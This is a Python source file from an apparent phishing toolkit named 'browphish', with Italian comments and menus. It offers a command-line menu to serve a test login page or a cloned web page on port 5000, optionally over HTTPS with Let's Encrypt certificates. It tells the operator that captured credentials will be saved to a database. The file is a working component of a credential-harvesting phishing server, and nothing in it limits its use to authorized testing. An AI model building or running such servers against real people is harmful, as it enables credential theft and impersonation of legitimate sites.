# browphish/src/modules/web_pages/server_manager.py

import logging
import time
from pathlib import Path
from colorama import Fore, Style
from cli.utils import prompt_for_input
from modules.web_pages.web_server import start_web_server

logger = logging.getLogger("browphish.modules.server_manager")

def start_phishing_server() -> None:
    """Gestisce l'avvio del server di phishing con scelta pagina."""
    print(f"\n{Fore.LIGHTRED_EX}--- AVVIO SERVER PHISHING ---{Style.RESET_ALL}")
    print(f"{Fore.LIGHTRED_EX}1.{Style.RESET_ALL} Mostra pagina di test (simple_login.html)")
    print(f"{Fore.LIGHTRED_EX}2.{Style.RESET_ALL} Mostra pagina clonata da data/captured_pages/")
    print(f"{Fore.RED}0.{Style.RESET_ALL} Annulla")
    choice = prompt_for_input("Scegli quale pagina servire: ")

    if choice == "1":
        page_name = "simple_login"
        page_path = "templates/web_pages/simple_login.html"
        start_server_with_page(page_name, "test")
    elif choice == "2":
        select_captured_page()
    elif choice == "0":
        print(f"{Fore.YELLOW}Operazione annullata.{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}Scelta non valida.{Style.RESET_ALL}")

def select_captured_page() -> None:
    """Seleziona una pagina clonata da servire."""
    # Elenca le pagine disponibili
    captured_dir = Path("data/captured_pages")
    pages = [p.stem for p in captured_dir.glob("*.html")]
    
    if not pages:
        print(f"{Fore.YELLOW}Nessuna pagina clonata trovata in data/captured_pages/{Style.RESET_ALL}")
        return
    
    print(f"{Fore.LIGHTRED_EX}Pagine disponibili:{Style.RESET_ALL}")
    for i, page in enumerate(pages, 1):
        print(f"  {i}. {page}")
    
    page_choice = prompt_for_input("Scegli pagina (numero): ")
    
    try:
        page_index = int(page_choice) - 1
        if 0 <= page_index < len(pages):
            page_name = pages[page_index]
            page_path = f"data/captured_pages/{page_name}.html"
            start_server_with_page(page_name, "captured")
        else:
            print(f"{Fore.RED}Scelta non valida.{Style.RESET_ALL}")
    except ValueError:
        print(f"{Fore.RED}Input non valido.{Style.RESET_ALL}")

def start_server_with_page(page_name: str, page_type: str) -> None:
    """Avvia il server con la pagina specificata, supportando HTTPS se i certificati sono presenti."""
    try:
        # Percorsi dei certificati Let's Encrypt
        cert_path = "/etc/letsencrypt/live/example.com/fullchain.pem"
        key_path = "/etc/letsencrypt/live/example.com/privkey.pem"
        ssl_context = None

        # Verifica se i certificati esistono
        if Path(cert_path).exists() and Path(key_path).exists():
            ssl_context = (cert_path, key_path)
            print(f"{Fore.LIGHTGREEN_EX}✓ Certificati Let's Encrypt trovati. Il server userà HTTPS.{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}Certificati Let's Encrypt non trovati. Il server userà HTTP.{Style.RESET_ALL}")

        # Passa ssl_context a start_web_server (deve supportarlo)
        start_web_server(page_name=page_name, page_type=page_type, ssl_context=ssl_context)
        print(f"{Fore.LIGHTRED_EX}✓ Server phishing avviato su {page_name} (porta 5000).{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Assicurati che un firewall non lo blocchi e che la porta sia libera.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Il server salverà le credenziali catturate nel database.{Style.RESET_ALL}")
        time.sleep(2)
    except Exception as e:
        logger.error(f"Errore nell'avvio del server: {e}", exc_info=True)
        print(f"{Fore.RED}✗ Errore nell'avvio del server: {e}{Style.RESET_ALL}") 